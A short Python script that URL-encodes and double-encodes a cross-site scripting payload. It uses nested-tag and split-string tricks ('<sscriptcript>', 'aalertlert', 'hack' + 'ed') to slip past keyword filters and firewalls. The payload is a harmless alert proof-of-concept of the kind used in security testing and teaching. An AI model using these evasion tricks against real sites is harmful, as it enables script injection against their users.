import urllib.parse

def encode_url(text):
    """Standard URL Encoding"""
    return urllib.parse.quote(text)

def decode_url(text):
    """Standard URL Decoding"""
    return urllib.parse.unquote(text)

def double_encode(text):
    """Encodes the % of a standard encoded string"""
    first_pass = urllib.parse.quote(text)
    return first_pass.replace('%', '%25')

def double_decode(text):
    """Decodes twice for deep analysis"""
    return urllib.parse.unquote(urllib.parse.unquote(text))

payload = '<sscriptcript>aalertlert("hacked")</sscriptcript>'

print(f"Original:      {payload}")
print(f"Single Encode: {encode_url(payload)}")
print(f"Double Encode: {double_encode(payload)}")

bypass_alert = "aalertlert('hack' + 'ed')"
print(f"Bypass URL:    {double_encode(bypass_alert)}")